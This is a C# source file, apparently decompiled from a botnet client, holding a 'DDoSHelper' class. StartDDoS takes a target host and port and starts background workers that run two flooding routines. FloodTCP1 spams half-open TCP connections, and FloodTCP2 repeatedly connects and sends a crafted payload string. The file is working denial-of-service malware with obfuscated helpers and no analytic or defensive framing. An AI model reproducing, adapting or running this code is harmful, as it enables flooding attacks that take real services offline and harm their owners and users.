namespace DDoS
{
    using MainBot;
    using System;
    using System.ComponentModel;
    using System.Net;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;
    using System.Text;
    using System.Threading;

    internal class DDoSHelper
    {
        private static BackgroundWorker[] backgroundWorker_0;
        private static byte[] byte_0;
        private static Delegate0 delegate0_0;
        private static IPEndPoint ipendPoint_0;
        private static uint NumThreads = 2;

        public static void AbortDDoS()
        {
            try
            {
                for (int i = 0; i < NumThreads; i++)
                {
                    backgroundWorker_0[i].CancelAsync();
                }
            }
            catch
            {
            }
        }

        private static void CloseSocket(IAsyncResult iasyncResult_0)
        {
            try
            {
                ((Socket) iasyncResult_0.AsyncState).Close();
            }
            catch
            {
            }
        }

        private static void FloodTCP1(object sender, DoWorkEventArgs e)
        {
            while (!(sender as BackgroundWorker).CancellationPending)
            {
                try
                {
                    using (Socket socket = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
                        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 0);
                        socket.BeginConnect(ipendPoint_0, new AsyncCallback(DDoSHelper.CloseSocket), socket);
                    }
                }
                catch
                {
                }
                Thread.Sleep(0x23);
            }
        }

        private static void FloodTCP2(object sender, DoWorkEventArgs e)
        {
            while (!(sender as BackgroundWorker).CancellationPending)
            {
                try
                {
                    using (Socket socket = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                    {
                        try
                        {
                            socket.Connect(ipendPoint_0);
                        }
                        catch
                        {
                            continue;
                        }
                        socket.Blocking = false;
                        socket.Send(byte_0);
                    }
                }
                catch
                {
                }
                Thread.Sleep(0x19);
            }
        }

        public static void StartDDoS(Enum0 enum0_0, string[] Hostnames)
        {
            AbortDDoS();
            string hostNameOrAddress = Convert.ToString(Hostnames[0]);
            ushort port = Convert.ToUInt16(Hostnames[1]);
            string str2 = string.Empty;
            switch (enum0_0)
            {
                case Enum0.const_0:
                    if (Hostnames.Length >= 3)
                    {
                        str2 = Convert.ToString(Hostnames[2]);
                        break;
                    }
                    str2 = <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_12();
                    break;

                case Enum0.const_1:
                    byte_0 = null;
                    delegate0_0 = new Delegate0(DDoSHelper.FloodTCP1);
                    goto Label_00D2;

                default:
                    goto Label_00D2;
            }
            byte_0 = Encoding.ASCII.GetBytes(string.Format(<PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_13(), new object[] { hostNameOrAddress, str2, Configuration.HWID2, Util.random_0.Next(200, 300), Environment.NewLine }));
            delegate0_0 = new Delegate0(DDoSHelper.FloodTCP2);
        Label_00D2:
            try
            {
                ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(hostNameOrAddress).AddressList[0], port);
            }
            catch
            {
                ipendPoint_0 = new IPEndPoint(IPAddress.Parse(hostNameOrAddress), port);
            }
            backgroundWorker_0 = new BackgroundWorker[NumThreads];
            for (int i = 0; i < NumThreads; i++)
            {
                backgroundWorker_0[i] = new BackgroundWorker();
                backgroundWorker_0[i].DoWork += new DoWorkEventHandler(delegate0_0.Invoke);
                backgroundWorker_0[i].WorkerSupportsCancellation = true;
                backgroundWorker_0[i].RunWorkerAsync();
            }
        }

        private delegate void Delegate0(object sender, DoWorkEventArgs e);

        public enum Enum0
        {
            const_0,
            const_1
        }
    }
}

